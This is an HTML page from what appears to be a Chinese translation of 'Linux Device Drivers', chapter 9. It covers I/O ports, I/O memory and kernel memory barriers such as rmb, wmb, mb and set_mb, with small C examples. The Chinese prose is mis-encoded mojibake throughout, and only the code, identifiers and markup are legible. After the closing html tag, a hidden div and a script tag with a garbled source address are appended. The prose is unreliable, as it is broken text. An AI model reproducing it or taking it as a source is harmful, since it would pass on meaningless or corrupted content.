<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>&#160;9&#160;&#160;ӲͨѶ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="index.html" title="Linux 豸 Edition 3">
<link rel="prev" href="ch08s06.html" title="8.6.&#160;ٲο">
<link rel="next" href="ch09s02.html" title="9.2.&#160;ʹ I/O ˿">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">&#160;9&#160;&#160;ӲͨѶ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch08s06.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch09s02.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="chapter" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title">
<a name="CommunicationwithHardware.chap"></a>&#160;9&#160;&#160;ӲͨѶ</h2></div></div></div>
<div class="toc">
<p><b>Ŀ¼</b></p>
<dl>
<dt><span class="sect1"><a href="ch09.html#IOPortsandIOMemor.sect">9.1. I/O ˿ں I/O ڴ</a></span></dt>
<dd><dl><dt><span class="sect2"><a href="ch09.html#IORegistersandConventionalMemory.sect">9.1.1. I/O Ĵͳڴ</a></span></dt></dl></dd>
<dt><span class="sect1"><a href="ch09s02.html">9.2. ʹ I/O ˿</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch09s02.html#IOPortAllocation.sect">9.2.1. I/O ˿ڷ</a></span></dt>
<dt><span class="sect2"><a href="ch09s02.html#ManipulatingIOports.sect">9.2.2.  I/O ˿</a></span></dt>
<dt><span class="sect2"><a href="ch09s02.html#IOPortAccessfromUserSpace.sect">9.2.3. ûռ I/O ȡ</a></span></dt>
<dt><span class="sect2"><a href="ch09s02.html#StringOperations.sect">9.2.4. ִ</a></span></dt>
<dt><span class="sect2"><a href="ch09s02.html#PausingIO.sect">9.2.5. ͣ I/O</a></span></dt>
<dt><span class="sect2"><a href="ch09s02.html#PlatformDependencies.sect">9.2.6. ƽ̨</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch09s03.html">9.3. һ I/O ˿</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch09s03.html#AnOverviewoftheParallelPort.sect">9.3.1. </a></span></dt>
<dt><span class="sect2"><a href="ch09s03.html#ASampleDriver.sect">9.3.2. һ</a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch09s04.html">9.4. ʹ I/O ڴ</a></span></dt>
<dd><dl>
<dt><span class="sect2"><a href="ch09s04.html#IOMemoryAllocationandMapping.sect">9.4.1. I/O ڴӳ</a></span></dt>
<dt><span class="sect2"><a href="ch09s04.html#AccessingIOMemory.sect">9.4.2. ȡ I/O ڴ</a></span></dt>
<dt><span class="sect2"><a href="ch09s04.html#PortsasIOMemory.sect">9.4.3. Ϊ I/O ڴĶ˿</a></span></dt>
<dt><span class="sect2"><a href="ch09s04.html#ReusingshortforIOMemory.sect">9.4.4.  short Ϊ I/O ڴ</a></span></dt>
<dt><span class="sect2"><a href="ch09s04.html#ISAMemoryBelow1MB.sect">9.4.5.  1 MB ֮µ ISA ڴ</a></span></dt>
<dt><span class="sect2"><a href="ch09s04.html#isareadbandFriends.sect">9.4.6. isa_readb </a></span></dt>
</dl></dd>
<dt><span class="sect1"><a href="ch09s05.html">9.5. ٲο</a></span></dt>
</dl>
</div>
<p>ܰŪ scull ƵǶ Linux 豸ӿһܺõ, ʵһ豸ҪӲ. Ӳ·֮ĳ; ͬ, Ҫ߹ͨ. ֱ, Ѿڲ; ͼͨչʾһδȡ I/O ˿ں I/O ڴ, ͬʱڸ Linux ƽ̨ǿֲ.</p>
<p>¼ֶܱӲĴͳ. , Ҫһӵĵط, ʹü򵥵 I/O ˿(׼ PC )չʾ I/O ָι, Լ֡ƵڴչʾڴӳI/O.</p>
<p>ѡ򵥵 I/O, Ϊһ/򿪵ʽ. ͬ, ʵԭʼ I/O ڴ󲿷ּ: д豸λܽ, ҴֱӴȡܽϵĵƽ. ʵ, 㲻ò LED һӡ˿ؿһ I/O Ľ, ǵײӲǳʹ.</p>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="IOPortsandIOMemor.sect"></a>9.1.&#160;I/O ˿ں I/O ڴ</h2></div></div></div>
<p>ÿ趼ͨдļĴ. 󲿷ʱһ豸мĴ, ַȡ, ڴַռ I/O ַռ.</p>
<p>Ӳ, ڴ I/O ûиϵ: ǶͨڵַߺͿϷźȡ(, дź)<sup>[<a name="id455522" href="#ftn.id455522">32</a>]</sup>ҶԻд.</p>
<p>һЩ CPU ǵоƬʵһַռ, Ϊ費ͬڴ, , Ӧһֿĵַռ. һЩ( x86 )зֿĶд߸ I/O ˿ں CPU ָȡ˿.</p>
<p>Ϊ豻ʺһ, Ҵ󲿷е I/O ߳ڸ˼, Щûеַռ I/O ˿ڵĴ, ҲڴȡһЩ豸ʱαװд˿, ⲿоƬ CPU ˵Ķ·. һǶʽӦõСг.</p>
<p>ͬ, Linux еļƽ̨ʵ I/O ˿ڵĸ, Щ CPU ʵһַռƽ̨. ˿ڴȡʵʱͺ( ΪͬͺʹòͬоƬӳߴ͵ڴַռ).</p>
<p>һĵַռ I/O ˿, е豸ӳǵļĴ I/O ˿. Ȼ ISA ʹ I/O ˿ձ, 󲿷 PCI 豸ӳĴһڴַ.  I/O ڴ淽ͨѡ, ΪҪʹĿĴָ; CPU ˴ȡڴЧ, ұȡڴʱиڼĴѰַģʽѡ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="IORegistersandConventionalMemory.sect"></a>9.1.1.&#160;I/O Ĵͳڴ</h3></div></div></div>
<p>ӲĴڴ֮ǿ, ȡ I/O ĴĳԱСıⱻ CPU(߱)ŻϷŪ, ޸ϣ I/O Ϊ.</p>
<p>I/O Ĵ RAM Ҫͬ I/O б߼Ч, ڴû: һڴдΨһЧǴ洢һֵһλ, һڴдֵ. Ϊڴȡٶȶ CPU Ҫ, ޱ߼ЧѱַʽŻ: ֵ,  /дָر.</p>
<p>ֵܹ CPU Ĵдڴ, Ҽ洢, дܹڻڴнжӴ RAM. رҲڱӲ𶼷: һִָܹеø, Բͬڳıгֵ˳ִ, , Ϊ RISC ˮеĻ. CISC , Ҫ൱ʱĲܹĲִ, .</p>
<p>Ӧڴͳڴʱ(ڵϵͳ)ЩŻ͸, ǿܶȷ I/O , ΪǸЩ"߼Ч", ҪԭΪʲôһȡ I/O Ĵ. ޷Ԥ, һЩĲ(һ, ߷һ I/O )ڴȡ˳.  CPU ֻʤ㲢رĲ; ֵĴǳڵ. , һȷûнл岢ڴȡĴʱûздر.</p>
<p>ӲԵ:ײӲѾ(Զػͨ Linux ʼ)ɽֹκӲ, ȡ I/O ʱ(ڴ滹Ƕ˿).</p>
<p>ԱŻӲرŵĽǰһڴڱһ˳Ӳ(һ)ɼĲ֮. Linux ṩ 4 ӦԿܵҪ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>#include &lt;linux/kernel.h&gt;</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void barrier(void)</span></span></dt>
<dd><p>֪һڴϵǶӲûӰ. Ĵ뽫еĵǰıĲפ CPU Ĵֵ洢ڴ, Һ¶ȡǵҪʱ. ϵĵֹԽϵŻ, Ӳر.</p></dd>
<dt><span class="term"><span>#include &lt;asm/system.h&gt;</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void rmb(void);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void read_barrier_depends(void);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void wmb(void);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void mb(void);</span></span></dt>
<dd>
<p>ЩӲڴڱָ; ǵʵʵƽ̨ص. һ rmb ( read memory barrier) ֤κγǰĶִκκ֮ǰ. wmb ֤де˳,  mb ָ֤. ÿЩָһϵĳ.</p>
<p>read_barrier_depends Ƕϵһ, Щʽ.  rmb ֹпԽϵĶر, read_barrier_depends ֹֻݵĶر. ΢С, ϵд. ȷеʲô, , һĶȷʵһȵܿ, Ӧʹ rmb.</p>
</dd>
<dt><span class="term"><span>void smp_rmb(void);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void smp_read_barrier_depends(void);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void smp_wmb(void);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>void smp_mb(void);</span></span></dt>
<dd><p>ϵЩ汾ںΪ SMP ϵͳʱӲ; , ǶչΪһ򵥵ϵ.</p></dd>
</dl></div>
<p>һ豸һ͵ڴϵ÷ʽ:</p>
<pre class="programlisting">
writel(dev-&gt;registers.addr, io_destination_address);
writel(dev-&gt;registers.size, io_size);
writel(dev-&gt;registers.operation, DEV_READ);
wmb();
writel(dev-&gt;registers.control, DEV_GO);
</pre>
<p>, Ҫ, ȷеĿһ豸Ĵڸʼǰѱȷ. ڴǿдҪ˳.</p>
<p>ΪڴӰ, ӦֻȷʵҪǵĵط. ϵĲͬҲвͬ, ֵʹضĿ. ,  x86 ϵ, wmb() Ŀǰʲô, Ϊдⲻر.  , ر,  mb()  wmb() .</p>
<p>ֵע󲿷ֵĴͬںԭ, ԭӵ _t , ͬڴһǺ. ֵעһЩ( PCI )ԼĻ; Ժ½ʱ.</p>
<p>һЩϵһֵһڴϵЧ. ںṩ˼; ȱʡ, ¶:</p>
<pre class="programlisting">
#define set_mb(var, value) do {var = value; mb();}  while 0
#define set_wmb(var, value) do {var = value; wmb();} while 0
#define set_rmb(var, value) do {var = value; rmb();} while 0
</pre>
<p>ںʵĵط, &lt;asm/system.h&gt; Щʹϵضָܿ. ע set_rmb ֻϵ϶. (һ do...while ṹʹһ׼ C , ʹչĺΪһ C й).</p>
</div>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id455522" href="#id455522">32</a>] </sup>еļƽ̨ʹһһдź; ЩвͬķѰַⲿ·. ͬ޹ص, , ǽȫжд.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch08s06.html">һҳ</a>&#160;</td>
<td width="20%" align="center">&#160;</td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch09s02.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">8.6.&#160;ٲο&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;9.2.&#160;ʹ I/O ˿</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>